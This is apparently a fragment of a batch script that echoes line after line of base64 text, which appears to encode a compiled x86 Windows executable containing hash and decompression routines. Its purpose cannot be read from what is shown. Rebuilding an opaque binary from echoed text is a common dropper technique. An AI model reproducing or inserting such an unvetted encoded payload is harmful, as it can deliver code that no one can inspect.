echo LDNKFNHBiUoMi9CJTCQUwc8CiUQkTIvPC0wkUIvHI0QkUCPNC8jBwgUDTCQUA8uL
echo XCRQwcsCjYLcvBuPA8GLTCRoiUQkSDNxBDNxMIvQM3EYgcXcvBuPi0QkTNHGiXEQ
echo i8gLy8HCBSPPI8MLwYtMJGgDxgPFi2wkTAPCwc0Ci3EIi9AzcTQzcRwzcRTRxolx
echo FIvNC0wkSCPLiUQkRMHCBYvFI0QkSAvIA84Dz42C3Lwbj4tUJGgDwYt8JEiJRCQU
echo wc8Ci0oMi/EzcjgzciAzchiJTCQYi88LTCRE0cYjzYlyGIvQwcIFi8cjRCREC8gD
echo zgPLjYLcvBuPi1QkaAPBi1wkRMHLAolEJBCLShCL8TNyPDNyJDNyHIlMJByLywtM
echo JBTRxiPPiXIci9CLw8HCBSNEJBQLyItEJBQDzsHIAgPNiUQkFI2q3LwbjwPpi0wk
echo aIvVwcIFizEzcSgzcSAzcRTRxolxIIvIC0wkECNEJBAjywvIi0QkEAPOwcgCA8+J
echo RCQQjbrcvBuPA/mLTCRoi9fBwgWLcQQzcSwzcSQzcRjRxolxJIvNC8iLxSNMJBQj
echo RCQQC8jBzQKLRCRoA84Dy4lsJFCNmty8G48D2YvNi3AIC88zcDAj7zNwKIvTM3Ac
echo I0wkENHGC80DzolwKANMJBSLdCQYM3A0M3AsM3AgwcIFwc8C0caJfCRYjarcvBuP
echo iXAsA+mLz4vVC8vBwgUjTCRQi8cjw8HLAgvIiVwkVItEJGgDzgNMJBCNsty8G4+L
echo VCQcA/GLzjNQODNQMDNQJNHCiVAwi8czw8HBBTPFwc0CA8IDRCRQjbnWwWLKiWwk
echo UItMJGgD+ItRPDNRNItBKDPQM1EU0cKJUTSLz4lEJESLwzPFwcEFM8bBzgIDwgNE
echo JFiNmdbBYsqLTCRoA9iLETNROItBLDPQM1EY0cKJUTiLy4lEJECLxzPFwcEFM8bB
echo zwIDwgNEJFSNqdbBYsqLTCRoA+iLUQQzUTyLQTAz0DNRHIlEJEyLx9HCM8OJUTwz
echo xovNgcLWwWLKwcEFA8IDRCRQA8iLVCRoiUwkUItMJGjBywKLQjSLUggzETPQiUQk
echo SIvBi0wkUMHBBYHB1sFiyjNQINHCiRCLxzPDgcfWwWLKM8XBzQIDwotUJBgDxot0
echo JFADyItEJGiJTCRYwcEFM1AEM1A4M1Ak0cKJUASLwzPFM8bBzgIDwotUJBwDx4t8
echo JFgDyItEJGiJTCRUwcEFM1AIM1A8M1Ao0cKJUAiLxTPGM8fBzwIDwo2R1sFiyotM
echo JGgDw4tcJFQD0ItEJBgzATNBLDNBFNHAiUEMi8qJRCQYi8MzxsHBBTPHA0QkGAPF
echo janWwWLKA+iLRCRowcsCi0AEi0wkHDPIiUQkLItEJGgzSDAzSBjRwYlIEIvDM8KJ
echo TCQcM8fBygIDRCQci80DxolUJFiLdCRYwcEFgcHWwWLKA8GLTCRoiUQkMItRCDNR
echo NDNRHDNRFNHCiVEUi8iLw8HBBTPGgcHWwWLKM8XBzQIDwolsJFgDx4t8JGgDwYlE
echo JBSLyIvGwcEFi1cMM8UzVziBxtbBYsozVyAzVxiNqdbBYsozRCQw0cIDwolXGItX
echo EAPDM1c8A+gzVySLx4tcJDCLzTNXHMHLAolcJDAzXCRYM1wkFMFMJBQC0cID2olX
echo HIsQA94zUCgzUCDBwQUD2TNQFNHCi/uJUCCLxTNEJDCBwtbBYsozRCQUA8LBxwUD
echo RCRYi1QkLAP4i0QkaIv3wc0CwcYFiWwkWDNQLDNQJDNQGNHCiVAkgcLWwWLKi8Uz
echo w8HLAjNEJBQDwolcJFQDRCQwA/CLRCRoi87BwQWLUAgzVCRMM1QkRDNQHNHCiVAo
echo i8Uzw42p1sFiyjPHwc8CA8KJfCRQA0QkFAPoi0QkaIvNwcEFi1AMM1QkSDNUJEAz
echo UCDRwolQLIvDM8eNmdbBYsozxsHOAgPCA0QkWAPYiXQkWItEJGiLy8HBBYtQJDNQ
echo EDNQODNUJEzRwolQMIvHM8YzxQPCA0QkVI251sFiysHNAgP4i0QkaIvPwcEFi1Ao
echo M1A8M1QkSDNQFNHCiVA0i8MzxsHLAjPFjbHWwWLKA8IDRCRQA/CLRCRoi87BwQWL
echo UCwzEDNQODNQGNHCiVA4i8Mzx8HPAjPFgcXWwWLKA8KNkdbBYsoDRCRYi0wkaAPQ
echo i0QkLDNBPDNBHDNBMNHAiUE8i8qJRCQsi8Mzx8HBBTPGA80DRCQsA8HBzgKLTCRg
echo AXkMAXEIAQEBUQQBWRBfXl1bg8RMw1NVVot0JBBXg35cAHQFjW5g6wIz7YtGFIvQ
echo i3wkHMHqA4PiP4lsJBSNDPiLx8HgA4lOFDvIcwP/RhiLx8HoHQFGGI0EOoP4P3ZN
echo akBbK9qNRhxT/3QkHAPCUOiijP//VY1GHFBW6Kfs//+DxBiNaz/rHYtEJBj/dCQU
echo g8DBA8VQVuiL7P//g8QMg8NAg8VAO+9y3zPS6wIz24tEJBgr+wPDV1CNRhwDwlDo
echo U4z//4PEDF9eXVvDi0wkBI1BRFCNQQRQ6A0BAABZWcIEAP90JARqAP81EIBBAP8V
echo PHVBAMIEAFZonAAAAGoA/zUQgEEA/xU4dUEAi/CNTkTHBoAAAABR6DQBAABZi8Ze
echo wggAagHodgoAAIXAdBzHQAQXx0AAx0AIbsdAAMdADOzGQADHQBACx0AAM8BAw/90
echo JAyLRCQI/3QkDIPARFDoLwgAAIPEDMIMAFaLdCQQhfZ0O4tUJAyDwgJOwe4CV4t8
echo JAxGD7ZKAQ+2Ao1SBMHhCAvID7ZC+8HhCAvID7ZC+sHhCAvIiQ+NfwROdddfXsNW
echo i3QkEIX2dDCLTCQIi1QkDEGDwgJOwe4CRopC/ohB/4pC/4gBjUkEigKNUgSIQf2K
echo Qv2IQf5OdeFew1WL7FFRVleLfQyNRfhqCI13EFZQ6Kz///+LDoPEDMHpA4PhP2o4
echo WDvIcgNqeFgrwVBoOHFBAFfobAcAAGoIjUX4UFfoYAcAAGoQV/91COhy////alhq
echo AFfoCYj//4PEMF9ei+Vdw4tEJASDYBQAg2AQAMcAASNFZ8dABImrze/HQAj+3LqY
echo x0AMdlQyEMOD7FCLRCRUi1QkWFNViwiDwgKLWASLaAiLQAxWV2oQiUwkFI10JCSJ
echo RCQYXw+2SgEPtgKNUgTB4QgLyA+2QvvB4QgLyA+2QvrB4QgLyIkOjXYET3XXi3Qk
echo FI2923AgJItUJBCLy/fRi8UjziPDC8iBwnikatcDTCQgi8MD0YHGVrfH6MHCBwPT
echo I8KLyvfRI80LyANMJCQD8cHGDAPyi86LxvfRI8Ijy4HD7s69wQvIi8YDTCQoA/nB
echo zw8D/iPHi8/30SPKC8iLxwNMJCwD2cHLCgPfI8OLy/fRI84LyIvDgcGvD3z1A0wk
echo MAPRwcIHA9OLyiPC99EjzwvIgcEqxodHA0wkNAPxwcYMA/KLzovG99EjwiPLC8iB
echo wRNGMKgDTCQ4A/nBzw8D/ovP99Ejyo2vsVv//4vGI8cLyIvHgcEBlUb9A0wkPAPZ
echo wcsKA98jw4vL99EjzgvIi8OBwdiYgGkDTCRAA9HBwgcD0yPCi8r30SPPC8iNuiIR
echo kGuBwa/3RIsDTCREA/HBxgwD8ovOi8b30SPCI8sLyIvGA0wkSAPpwc0PA+6LzYls
echo JBT30SPFI8oLyIvFgcG+11yJA0wkTAPZwcsKA92Ly4lcJBj30SPDI84LyIvDA0wk
echo UAP5wccHA/uLz4l8JBz30SPHI82NrpNxmP0LyANMJFQD6cHFDAPvi/X31ovOI8uL
echo xYtcJBQjxwvIgcOOQ3mmA0wkWIvFA9nByw8D3SPDi9P30iPzi8ojz4t8JBgLyIHH
echo IQi0SQNMJFyLxQP5wc8KA/sjxyPXC/CLzwN0JCT30YtEJBwFYiUe9gPwi8PBxgUD
echo 9yPGI84L0IHCQLNAwANUJDgD1cHCCQPWi8IjxwvIgcFRWl4mA0wkTAPZi8730cHD
echo DiPKA9qLwyPGC8iLwoHBqse26QNMJCAD+YvK99HBzwwjywP7I8cLyIvDgcFdEC/W
echo A0wkNAPxi8vBxgX30QP3I88jxgvIgcFTFEQCA0wkSAPRi8/30cHCCSPOA9aLwiPH
echo C8iBwYHmodgDTCRcA9mLzvfRwcMOI8oD2ovDi+sjxvfVC8iLwoHByPvT5wNMJDAD
echo +YvK99HBzwwjywP7I8cj7wvIi8OBwebN4SEDTCREA/GLz8HGBffRA/cjxiPOC+iB
echo xdYHN8MDbCRYA+qNlgXp46nBxQkD7ovFI8cLyIHBhw3V9ANMJCwD2YvO99HBww4j
echo zQPdi8MjxgvIi8WBwe0UWkUDTCRAA/mLzcHPDPfRA/sjyyPHiXwkHAvIA0wkVAPR
echo i/PBwgUD1/fWI/eLwyPCi88L8PfRgcb4o+/8I8oDdCQoA/XBxgkD8ovGI8eNu9kC
echo b2cLyItcJBwDTCQ8gcOKTCqNA/mLysHHDvfRA/4jzovHI8ILyIvGA0wkUDPHA9nB
echo ywwD3zPDBUI5+v8DRCQ0A9CLxzPDwcIEA9MzwgWB9nGHA0QkQAPwwcYLA/KLxovO
echo M8MzwgUiYZ1tA0QkTAP4wccQA/4zz4vBM8IFDDjl/QNEJFgD2IvHwcsJA98zyzPD
echo gcFE6r6kA0wkJAPRwcIEA9MzwgWpz95LA0QkMAPwwcYLjarGfpsoA/KLxovOM8Mz
echo wgVgS7v2A0QkPAP4wccQA/4zz4vBM8IFcLy/vgNEJEgD2IvHwcsJA98zwzPLA0wk
echo VAPpwcUEA+szxQX6J6HqA0QkIAPwwcYLA/WLxovOM8MzxQWFMO/UA0QkLAP4wccQ
echo A/4zz4vHi9Ez1YHCBR2IBANUJDgD08HKCQPXM8ozwoHBOdDU2QNMJEQDzcHBBAPK
echo M8EF5Znb5gNEJFAD8MHGCwPxi8YzwjPBBfh8oh8DRCRcA/iLxsHHEAP+M8czwQVl
echo VqzEA0QkKAPQi8bBygkD1/fQC8IzxwVEIin0A0QkIAPIi8f30MHBBgPKC8EzwgWX
echo /ypDA0QkPAPwi8L30MHGCgPxC8YzwQWnI5SrA0QkWAP4i8H30MHHDwP+C8czxgU5
echo oJP8A0QkNAPQi8b30MHKCwPXC8IzxwXDWVtlA0QkUAPIi8f30MHBBgPKC8EzwgWS
echo zAyPA0QkLAPwi8L30MHGCgPxC8YzwQV99O//A0QkSAP4i8H30MHHDwP+C8czxgXR
echo XYSFA0QkJAPQi8b30MHKCwPXC8IzxwVPfqhvA0QkQAPIi8fBwQYDyvfQjZ7g5iz+
echo C8GNqqERCE4zwo2xgn5T9wNEJFwD2IvC99DBwwoD2QvDM8EFFEMBowNEJDiNkzXy
echo Or0D+IvB99DBxw8D+wvHM8MDRCRUA+iNj7vS1yrBzQuLw/fQA+8LxTPHA0QkMAPw
echo i8f30It8JGTBxgYD9QvGM8UDRCRMA9CLxffQwcIKA9YLwjPGA0QkKAPIi0QkEAPG
echo wcEPA8qJBwFPCI2FkdOG6/fWC/Ez8gN0JEQDxsHICwNHBAPBAVcMiUcEX15dW4PE
echo UMNTi1wkEFaLdCQMV4tGEIvQweoDg+I/jQzYi8PB4AOJThA7yHMD/0YUakCLw8Ho
echo HQFGFF8r+jvfckRVV/90JByNRhgDwlDoUQAAAI1GGFBW6JL4//+DxBSNbz/rGItE
echo JBiDwMEDxVBW6Hr4//9Zg8dAg8VAWTvrcuQz0l3rAjP/i0QkFCvfA8dTUI1GGAPC
echo UOgHAAAAg8QMX15bw4tUJAyF0nQVi0wkBFaLdCQMK/GKBA6IAUFKdfdew4N8JAwA
echo D4f6f///w8zMzMzMzMzMzFOLXCQIVlf/dCQUM/bo3gAAAIv4hf90RYXbdQW7JDBB
echo AItHBGoB/3QkHP/Qi/CF9nQrU+joUAAAi9iL041CAZCKCkKEyXX5K9CLRwhSU1b/
echo 0ItHDFb/0FPos1AAAP90JBxW6DkBAACF9nQGi0cQVv/QX15bwhAAzMzMzMzMzMzM
echo /3QkDGoA/3QkEP90JBDobf///8IMAMzMzMzMzMzMzMxWV/90JBQz9uhDAAAAi/iF
echo /3Qii0cEagFW/9CL8IX2dBT/dCQQi08I/3QkEFb/0YtHDFb/0P90JBhW6MEAAACF
echo 9nQGi0cQVv/QX17CEADMzFaLdCQIM9KD/v91ETkVCIFBAHQouBCBQQBewgQAiw0I
echo gUEAhcl+FbgQgUEAjWQkADkwdQKL0IPAFEl19IvCXsIEAMzMzMzMzMzMzMzMzMzM
echo iw0IgUEAVot0JAhXM/+D/v91BIXJ6xmFyX4euBCBQQCL0TkwdQKL+IPAFEp19IX/
echo dAdfM8BewgQAjQSJQYk0hRCBQQBfiQ0IgUEAjQSJjQSF/IBBAF7CBADMzMzMzMzM
echo VleLfCQMM/aF/3QMiweZg+IHjTQCwf4D/3QkEI0MNlHoGxAAAIvIhfZ+MY1XBIv/
echo D7YCjUkEwegEjVIBD76A8DZBAGaJQfwPtkL/g+APD76A8DZBAGaJQf5OddQzwF9m
echo iQFewggAVos1EIZBAOsUi04Qhcl0C4tGCANEJAhQ/9FZizaF9nXog3wkCABedBL/
echo dCQEagD/NRCAQQD/FTx1QQDCBACDPRZwQQAAD4QBAAAAw4M9FIZBAAB0DP81GIZB
echo AP8VjHVBAMNX/zUYhkEA/xWQdUEAi/iF/3VOVv81FIZBAGoI/zUQgEEA/xU4dUEA
echo i/hX/zUYhkEA/xWUdUEAizUQhkEA6xKLTgyFyXQJi0YIA8dQ/9FZizaF9nXqV2iG
echo 0kAA6DpNAABei0QkCAPHX8IEAFNVVot0JBCLzleD4QN0B2oEWCvBA/ChFIZBAIsd
echo lHVBAIXAdSj/FZh1QQBWagj/NRCAQQCjGIZBAP8VOHVBAFD/NRiGQQD/06EUhkEA
echo i/gDxlD/NRiGQQCjFIZBAP8VkHVBAFBqCP81EIBBAP8VnHVBAIvoVf81GIZBAP/T
echo i3QkGItcJByF9nUEhdt0IWoUaBCGQQDohgcAAFlZiTiJcASJWAiF9nQHjQwvUf/W
echo WYvHX15dW8IMAFaLdCQIV41+IFf/FQx1QQCLTCQQhcl4HztOCH0ai0YMgzyIAHQd
echo /zZqAP80iOg0fP//g8QM6wxRjUYQUOjnBgAAWVlX/xUUdUEAX17CCABTVleLfCQQ
echo jV8gU/8VDHVBAIt0JBSF9ngLO3cIfQaLRwyLNLBT/xUUdUEAhfZ0CIsO99kbySPx
echo X4vGXlvCCABTVot0JAxXjV4gU/8VDHVBAIt8JBSD//91FYsGg8AIUI1GEFDosQYA
echo AFlZi/DrVjt+CHwgi0YEA8eJRgjB4AJQ/3YMagj/NRCAQQD/FZx1QQCJRgyLRgyD
echo PLgAdAyLRhSFwHQbV//Q6xb/NmoI/zUQgEEA/xU4dUEAi04MiQS5i0YMizS4U/8V
echo FHVBAF+Lxl5bwggAV2o4agj/NRCAQQD/FTh1QQCLTCQIi/iDZxAAiQ+LTCQQiU8U
echo i0wkDIlPBIlPCMHhAlFqCP81EIBBAP8VOHVBAIlHDI1HIFD/FRh1QQCLx1/CDABV
echo VleLfCQQM9KL6jlXHHQMjUcgUP8VDHVBADPSi3cEhfZ0eYtOFIXJfhGLbgiLRQCJ
echo RgiNQf+JRhTrFItOEI1uGItHEA+vwQPojUEBiUYQOVYUD4XjAAAAi0YQO0YMD4zX
echo AAAAiw6FyXQGi0YEiUEEiwY7dwR1BYlHBOsFi04EiQGLB4kGiVYEiTeLBoXAD4Sn
echo AAAAiXAE6Z8AAABTi18MwfsEg+PwO18UfQWLXxTrCDtfGH4Di18Yi0cQD6/Dg8AY
echo UFL/NRCAQQD/FTh1QQAzyYvwQYX2dAWJXgzrIYtHEIPAGFBqAP81EIBBAP8VOHVB
echo AIvwhfZ0QDPJQYlODItGDDPSAUcMiU4QiVYUiVYIOU4Mfg2LRwSJBolWBIl3BOsJ
echo iweJBolWBIk3iwaFwHQDiXAEjW4Y6wIz0ls5Vxx0Co1HIFD/FRR1QQCF7XQIiXUA
echo jUUE6wIzwF9eXcIEAFVWV4t8JBAz7TlvHHQKjUcgUP8VDHVBAItHBIXAdBaLMFBV
echo /zUQgEEA/xU8dUEAi8aF9nXqiweFwHQWizBQVf81EIBBAP8VPHVBAIvGhfZ16okv
echo iW8EiW8MOW8cdAqNRyBQ/xUUdUEAX15dwgQAVot0JAhXM/85fhx0Co1GIFD/FQx1
echo QQCLTCQQg8H8ixGLQgiJAf9CFItCEIlKCDlCFHVNg3oMAYsKdRSFyXQGi0IEiUEE
echo iwI7FnUaiQbrG4XJdAaLQgSJQQSLAjtWBHUFiUYE6wWLSgSJAYtCDClGDFJX/zUQ
echo gEEA/xU8dUEA6zqDehQBdTQ7Qgx8L4sKhcl0BotCBIlBBIsCOxZ1BIkG6wWLSgSJ
echo AYtGBIkCiXoEiVYEiwKFwHQDiVAEOX4cdAqNRiBQ/xUUdUEAX17CCACLRCQQU4tc
echo JAhVVldqBFkD2Yv4M+2L04PnA4v1g+IDdAQrygPZqAQPhKwAAABo4tlAAGgchkEA
echo 6O4BAABoJIZBAP8VDHVBAKEghkEAi2wkIOsMOVgMdQU5aBB0CIsAhcB18OsK/0AU
echo i3AIhfZ1XmoYagD/NRCAQQD/FTh1QQCL+IX/dEiLxYPg+1D/dCQgjUP8/3QkIFDo
echo Zf///4vwhfZ0K6EghkEAiX4Ig2cEAIl3CIlfDIlvEMdHFAEAAACJB4XAdAOJeASJ
echo PSCGQQBoJIZBAP8VFHVBAOtLajhV/zUQgEEA/xU4dUEAi/CF9nQ2i0QkGIlGFItE
echo JByJRhgzwECJLoluBIluCIleEDv4dAmF/3QFiW4c6w2JRhyNRiBQ/xUYdUEAX4vG
echo Xl1bwhAAVot0JAhXi34Ihf90ZVW9JIZBAFX/FQx1QQCLRgj/SBSLRgiDeBQAfz+D
echo ZggAVujN////iw+FyXQGi0cEiUEEi08Ehcl0BIsHiQE5PSCGQQB1B4sHoyCGQQBX
echo agD/NRCAQQD/FTx1QQBV/xUUdUEAXeslVugf/f//g34cAHQKjUYgUP8VoHVBAFZq
echo AP81EIBBAP8VPHVBAF9ewgQAaCSGQQD/FRh1QQCDJSCGQQAAw1WL7FaLdQiDfhQA
echo dBxW6BMBAADrBv91CP9WFI1FCFBW6KoAAACFwHXsXl3CBAD/VCQIi0QkDMcABAAA
echo ADPAQMIMAGhAhkEA/xUYdUEAw1WL7FFTVldoADdBADPb/xVAdUEAi3UIi/iF/3Qr
echo aBw3QQBX/xUsdUEAhcB0EI1N/FH/dQxoI9pAAFb/0ENX/xXYdEEAhdt1MGoAagFW
echo /xWkdUEAg+gAdBRIdR3rCGoA/xUodUEAgz4CdfPrDP9VDGoCVv8VqHVBAF9eW4vl
echo XcIIAItMJARWV4t8JBAz9otRGIXSeB87UQh9GotBDIsEkIXAdAmDOAB0BIvwiRf/
echo QRiF9nTahfZ1GotBEIXAdAmNcAiJN4X2dQqDwSBR/xUUdUEAX4vGXsIIAFaLdCQI
echo jUYgUP8VDHVBAINmGABewgQAi1QkCItMJASD6giLAjkRdQ6JAYsChcB0F4NgBADr
echo EYtKBIkBiwqFyXQGi0IEiUEEUmoA/zUQgEEA/xU8dUEAw/90JAhqCP81EIBBAP8V
echo OHVBAIvIhcl0E4tUJASLAoXAdAeJSASLAokBiQqNQQjDxwVchkEAyttAAMcFWIZB
echo AHHcQADHBWiGQQBp3UAAxwV0hkEAGN1AAMNVi2wkGFZXM/b/dQDoQgEAAIt8JBSF
echo /w+OggAAAFOLXCQUD6/fg8MYU1b/NRCAQQD/FTh1QQCL8IX2dGKLRCQUi0wkHIlG
echo BItEJCCJRgiNQ+hQiX4QiU4UiW4MxwYBAAAAg8YYagBWiXQkMOg2dP//g8QMiXUA
echo i2wkIFXoGj4AAIXAdBqF/34Wi96LdCQUVVPoMEIAAAPeT3X0i3QkJFtfi8ZeXcIU
echo AIPsDItUJCAzwFNWi3QkGDPJQIlMJAiJRCQMi9qF9n5lVTPbiXQkHFdDjXoEiweF
echo wH8HM8lBiUwkEA+vRCQUi+vHRCQwAQAAAIlEJBQ73n0ai0wkMA+vTKoERTvufPaL
echo RCQUiUwkMItMJBCLbCQwQ4kvg8cE/0wkIHWyX11qAIXJWXUai9pT/3QkKP90JChQ
echo /3QkLOjB/v//i8iJcehei8Fbg8QMwhQA6QAAAABWi3QkCIX2dD+D7hhVM+05bgh0
echo IFOL3VeNfhg5bhB+Ev92CFfoREAAAAN+BEM7XhB87l9bi0YMVlWJKP81EIBBAP8V
echo PHVBAF1ewgQAU1aLdCQMM9uF9g+EpgAAAFeLfCQUhf8PhJgAAACD7xhVi27oOy8P
echo hYgAAAA5XCQcdBn/dwz/dvD/dvz/dvj/duzoG/7//4146Ikvg/0BfhyLxcHgAlCL
echo RvSDwARQi0cMg8AEUOhldf//g8QMi074O08QdUA5XvB0JIPHGIvuhcl+L1X/dvD/
echo duxX6Lw8AAADbuwDfuxDO174fOfrFItG7A+vwVCNRxhWUOggdf//g8QMM9tDXV9e
echo i8NbwgwAzMzMzMzMzMzMzFWL7GoAaAAQAABqAP8VuHRBAKMoh0EA/xWYdUEAo3hx
echo QQDoSQgAAF3DzMzMzMzMzFWL7KEoh0EAUP8VwHRBAIsNeHFBAFH/FYx1QQBdw8zM
echo VYvsg+wM/xWsdUEAiUX4oXhxQQBQ/xWQdUEAiUX8i038i1EIiVX0i0X4UP8VsHVB
echo AItF9IvlXcPMzMzMzMzMzFWL7IPsCKF4cUEAUP8VkHVBAIlF+ItN+ItRCCtVDIlV
echo /ItFCIM4AHUdi038g8EKUWoAixUoh0EAUv8VOHVBAItNCIkB6yGLVfyDwgpSi0UI
echo iwhRagCLFSiHQQBS/xWcdUEAi00IiQGLVfzR6lKLRfiLCANNDFGLVQiLAlDoXwQA
echo AItN+ItVDIlRCIvlXcIIAFWL7FBSg30IAHQTi0UIUGoAiw0oh0EAUf8VPHVBAFpY
echo XcIEAMzMzMzMzMzMzMzMzFWL7FGLRQiJRfyLTfyLEVJqAKEoh0EAUP8VPHVBAItN
echo /FFqAIsVKIdBAFL/FTx1QQCL5V3CBADMzMzMzMzMzMxVi+yDPXhxQQD/dR7oX/7/
echo /6F4cUEAUP8VkHVBAFBogN9AAOiaQAAA6y6LDXhxQQBR/xWQdUEAhcB1HeigBgAA
echo ixV4cUEAUv8VkHVBAFBogN9AAOhqQAAAXcPMzMzMzMxVi+yD7AjHRfwAAAAAg30I
echo AHQPi0UIUOjpcv//g8QEiUX8av+LTfxR6BMCAACJRfiDfQgAdBOLVfxSi0UIUItN
echo +FHoOQMAAOsMM9KLRfyLTfhmiRRBi+VdwgQAzMzMzMxVi+xRoXhxQQBQ/xWQdUEA
echo iUX8i038i1EIg8ICi0X8iVAIi+Vdw8zMzMzMzMzMzMxVi+xRoXhxQQBQ/xWQdUEA
echo iUX8i038iwGLVfwDQgiL5V3DzMzMzMzMzMzMzMzMzMxVi+xRg30MAHQ9i0UMUOgy
echo cv//g8QEiUX8i038jVQJClJqAKEoh0EAUP8VOHVBAItNCIkBi1X8UotFDFCLTQiL
echo EVLoeQIAAIvlXcIIAMzMzFWL7FHHRfwAAAAAg30MAHRsi0UMUOjbcf//g8QEiUX8
echo i00IgzkAdR6LVfyNRBIKUGoAiw0oh0EAUf8VOHVBAItVCIkC6yKLRfyNTAAKUYtV
echo CIsCUGoAiw0oh0EAUf8VnHVBAItVCIkCi0X8UItNDFGLVQiLAlDo9QEAAOsmi00I
echo gzkAdB6LVQiLAlBqAIsNKIdBAFH/FTx1QQCLVQjHAgAAAACLRfyNRAACi+VdwggA
echo VYvsUaF4cUEAUP8VkHVBAIlF/ItN/ItVCDsRciGLRfyLCItV/ANKCDlNCHcRi0X8
echo i00IKwiDwQGLwesE6wIzwIvlXcIEAMzMzMzMzMzMzMxVi+xRoXhxQQBQ/xWQdUEA
echo iUX8i038iwEDRQiL5V3CBADMzMzMzMzMzMzMzMzMzMxVi+yD7AyheHFBAFD/FZB1
echo QQCJRfyDfQz/dQmLTfyLUQiJVQyLRfyLSAiLVQiNBFGJRfiLTfyLUQSD6gQ5Vfh8
echo M4tF+AUAQAAAi038iUEEi1X8i0IEg8AKUItN/IsRUmoAoSiHQQBQ/xWcdUEAi038
echo iQHrSItV/IF6BAAAEAB+PIF9+AAAEAB9B8dF+AAAEACLRfyLTfiJSASLVfyLQgSD
echo wApQi038ixFSagChKIdBAFD/FZx1QQCLTfyJAYtV/IsCA0UMiUX0i00Ii1UMjQRK
echo i038iUEIi0X0i+VdwggAzFWL7FGheHFBAFD/FZB1QQCJRfyLTfyLVQiJUQiLRfyL
echo CDPSi0UIZokUAYvlXcIEAFWL7FGheHFBAFD/FZB1QQCJRfyLTfyLEYtFCI1EAv+L
echo 5V3CBADMzMzMzMzMzMzMzFWL7FGLRRCLTQiNFEGJVfyDfRAAfieLRQiLTQyLEYkQ
echo i0UIg8AEiUUIi00Mg8EEiU0Mi1UQg+oCiVUQ69MzwItN/GaJAYvlXcIMAMzMzMzM
echo VYvsUaF4cUEAUP8VkHVBAIlF/ItNCNHhi1X8i0IIK8GLTfyJQQiL5V3CBADMzMzM
echo VYvsg+wMx0X4AAAAAItFCIlF9ItNCA+2EYXSD4RPAgAAi0X4O0UMD41DAgAAi00I
echo Zg+2EWaJVfwPt0X8JYAAAAB1F4tNCIPBAYlNCItV+IPCAYlV+OkRAgAAD7dF/CXg
echo AAAAPcAAAAB1MotNCIPBAYlNCItVCA+2AiXAAAAAPYAAAAB1EotNCIPBAYlNCItV
echo +IPCAYlV+OnPAQAAD7dF/CXwAAAAPeAAAAAPhZIAAAC5AQAAAMHhAItVCA+2BAqF
echo wHR/uQEAAADB4QCLVQgPtgQKJcAAAAA9gAAAAHUuuQEAAADR4YtVCA+2BAolwAAA
echo AD2AAAAAdRSLTQiDwQOJTQiLVfiDwgGJVfjrMbgBAAAAweAAi00ID7YUAYHiwAAA
echo AIH6gAAAAHULi0UIg8ACiUUI6wmLTQiDwQGJTQjpKQEAAA+3VfyB4vgAAACB+vAA
echo AAAPhQoBAAC4AQAAAMHgAItNCA+2FAGF0g+E8wAAALgBAAAA0eCLTQgPthQBhdIP
echo hN0AAAC4AQAAAMHgAItNCA+2FAGB4sAAAACB+oAAAAB1S7gBAAAA0eCLTQgPthQB
echo geLAAAAAgfqAAAAAdS+4AQAAAGvIA4tVCA+2BAolwAAAAD2AAAAAdRSLTQiDwQSJ
echo TQiLVfiDwgGJVfjrc7gBAAAAweAAi00ID7YUAYHiwAAAAIH6gAAAAHUnuAEAAADR
echo 4ItNCA+2FAGB4sAAAACB+oAAAAB1C4tFCIPAA4lFCOsvuQEAAADB4QCLVQgPtgQK
echo JcAAAAA9gAAAAHULi00Ig8ECiU0I6wmLVQiDwgGJVQjrCYtFCIPAAYlFCOmj/f//
echo i0UIK0X0i+VdwggAzMzMzFWL7FFqDGoAoSiHQQBQ/xU4dUEAiUX8ahBqAIsNKIdB
echo AFH/FTh1QQCLVfyJAotF/MdABBAAAACLTfzHQQgAAAAAi1X8UqF4cUEAUP8VlHVB
echo AIvlXcPMzMzMzMzMzMzMzFWL7FGheHFBAFD/FZB1QQCJRfyLTfyLEVJqAKEoh0EA
echo UP8VPHVBAItN/FFqAIsVKIdBAFL/FTx1QQCL5V3DzMxVi+yD7AiheHFBAFD/FZB1
echo QQCJRfyLTfyLVQiJUQiLRfyLCItV/ANKCIlN+ItF+IvlXcIEAMzMzMzMzMzMzMzM
echo VYvsg+wI/xWsdUEAiUX4oXhxQQBQ/xWQdUEAiUX8i038i1UIiVEIi0X4UP8VsHVB
echo AIvlXcIEAMzMzMzMzMzMzI1EJBBQ/3QkEP90JBD/dCQQ6AoAAACDxBDDzMzMzMzM
echo g+w8U4tcJFBVi2wkTFaLG1eLdQCF9nQNi3wkUMdFAAAAAADrDY18JBO+AQAAAIl8
echo JFCLRCRYajiJRCQYjUQkGGgwN0EAUMdEJCQAAAAAx0QkQAAAAADHRCREAAAAAMdE
echo JEgAAAAA6OUZAACDxAyFwA+FuQAAAIl8JCCJRCQki/+FwHUSg/7/dgWDyP/rAovG
echo iUQkJCvwg3wkGAB1EoP7/3YFg8j/6wKLw4lEJBgr2I1EJBRqAFDotQAAAIv4g8QI
echo hf91BotEJCTrtotMJFyLRCQYA8MpAY1EJBM5RCRQdAmLRCQoiUUA6w+DfCQoAHQI
echo g//7dQONdwaNRCQUUOgeGAAAg8QEg/8BdQwz/4vHX15dW4PEPMOD/wJ0DYP/+3UN
echo i0QkJAPGdAW//f///4vHX15dW4PEPMPMzMzMzMzMzMyLRCQEx0BQODdBAMdAWAkA
echo AADHQFQ4P0EAx0BcBQAAAMPMzMzMzMzMzMzMzMzMzMyLTCQEg+w4V4XJD4QDFwAA
echo g3kgAA+E+RYAAIN5JAAPhO8WAACLeRyJfCQUhf8PhOAWAAA5Dw+F2BYAAItHBD00
echo PwAAD4zKFgAAPVM/AAAPj78WAACDeQwAD4S1FgAAgzkAdQqDeQQAD4WmFgAAPT8/
echo AAB1B8dHBEA/AACLQQyLVzyJRCQYi0EQiUQkDIlEJBwzwFOLGYlEJCSLRwRVi2kE
echo LTQ/AACJXCQQiVQkDIlsJDhWi3dAg/geD4ekCQAAjV9YiVwkQItcJBSNpCQAAAAA
echo /ySFcABBAItHDIXAdQzHRwRAPwAA6WcJAACD/hBzK5CF7Q+E7wQAAA+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE2D/hBy3YtHDItMJEyoAnRTgfofiwAAdUuDfygAdQfHRygP
echo AAAAagBqAGoA6FIbAACJRxyNRCQoagJQZsdEJDAfi/93HOg5GwAAM9KJRxyDxBiJ
echo VCQQM/bHRwQ1PwAA6dwIAACLRyTHRxQAAAAAhcB0B8dAMP/////2RwwBD4TFAAAA
